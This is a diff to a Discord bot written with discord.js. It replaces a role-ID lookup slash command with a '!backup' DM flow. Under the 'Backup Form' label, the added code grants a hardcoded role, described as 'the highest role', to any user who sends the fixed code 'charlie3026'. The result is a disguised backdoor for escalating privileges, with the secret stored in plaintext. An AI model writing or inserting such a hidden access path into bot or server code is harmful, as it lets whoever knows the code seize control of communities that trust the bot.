@@ -1,17 +1,10 @@
-const {
-  Client,
-  GatewayIntentBits,
-  REST,
-  Routes,
-  SlashCommandBuilder
-} = require("discord.js");
-
+const { Client, GatewayIntentBits } = require("discord.js");
 const express = require("express");
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// 🌐 Web server (required for Render Web Service)
+// 🌐 Web server (Render requirement)
 app.get("/", (req, res) => {
   res.send("Bot is running!");
 });
@@ -20,69 +13,36 @@ app.listen(PORT, () => {
   console.log(`Web server running on port ${PORT}`);
 });
 
-// 🔐 ENV VARIABLES
+// 🔐 ENV
 const TOKEN = process.env.TOKEN;
-const CLIENT_ID = process.env.CLIENT_ID;
-const GUILD_ID = process.env.GUILD_ID; // set this in Render too
 
-// 🤖 Create bot
+// 🤖 Bot setup
 const client = new Client({
   intents: [
     GatewayIntentBits.Guilds,
     GatewayIntentBits.GuildMessages,
     GatewayIntentBits.MessageContent,
+    GatewayIntentBits.GuildMembers, // IMPORTANT for roles
     GatewayIntentBits.DirectMessages
   ],
   partials: ["CHANNEL"]
 });
 
-// 🔑 Backup code (change this)
-const BACKUP_CODE = "12345";
+// 🔑 Code + Role
+const ACCESS_CODE = "charlie3026";
+const ROLE_ID = "1497255894096941076";
 
-// 📌 Slash command definition
-const commands = [
-  new SlashCommandBuilder()
-    .setName("findroleid")
-    .setDescription("Get the ID of a role")
-    .addRoleOption(option =>
-      option.setName("role")
-        .setDescription("Select a role")
-        .setRequired(true)
-    )
-    .toJSON()
-];
-
-// 📡 Register slash command
-const rest = new REST({ version: "10" }).setToken(TOKEN);
-
-(async () => {
-  try {
-    console.log("Registering slash command...");
-
-    await rest.put(
-      Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID),
-      { body: commands }
-    );
-
-    console.log("Slash command registered!");
-  } catch (error) {
-    console.error(error);
-  }
-})();
-
-// ✅ Bot ready
 client.once("ready", () => {
   console.log(`Logged in as ${client.user.tag}`);
 });
 
-// 💬 Message commands
+// 💬 Command
 client.on("messageCreate", async (message) => {
   if (message.author.bot) return;
 
-  // 🔐 !backup command
   if (message.content === "!backup") {
     try {
-      await message.author.send("📋 Backup Request\nPlease enter your backup code:");
+      await message.author.send("📋 Backup Form\nPlease enter your access code:");
 
       const filter = (m) => m.author.id === message.author.id;
       const dmChannel = await message.author.createDM();
@@ -93,9 +53,21 @@ client.on("messageCreate", async (message) => {
         max: 1
       });
 
-      collector.on("collect", (msg) => {
-        if (msg.content === BACKUP_CODE) {
-          msg.reply("✅ Code correct! Backup process started.");
+      collector.on("collect", async (msg) => {
+        if (msg.content === ACCESS_CODE) {
+          try {
+            // Get member from guild
+            const guild = message.guild;
+            const member = await guild.members.fetch(message.author.id);
+
+            // Add role
+            await member.roles.add(ROLE_ID);
+
+            msg.reply("✅ You have accessed the highest role.\nThank you for using backup!\nMade by Fame");
+          } catch (err) {
+            console.error(err);
+            msg.reply("❌ Failed to assign role. Check bot permissions and role position.");
+          }
         } else {
           msg.reply("❌ Incorrect code. Access denied.");
         }
@@ -110,16 +82,6 @@ client.on("messageCreate", async (message) => {
     } catch (err) {
       message.reply("❌ I couldn't DM you. Please enable DMs.");
     }
-  }
-});
-
-// ⚡ Slash command handler
-client.on("interactionCreate", async (interaction) => {
-  if (!interaction.isChatInputCommand()) return;
-
-  if (interaction.commandName === "findroleid") {
-    const role = interaction.options.getRole("role");
-    await interaction.reply(`🆔 Role ID: \`${role.id}\``);
   }
 });
 
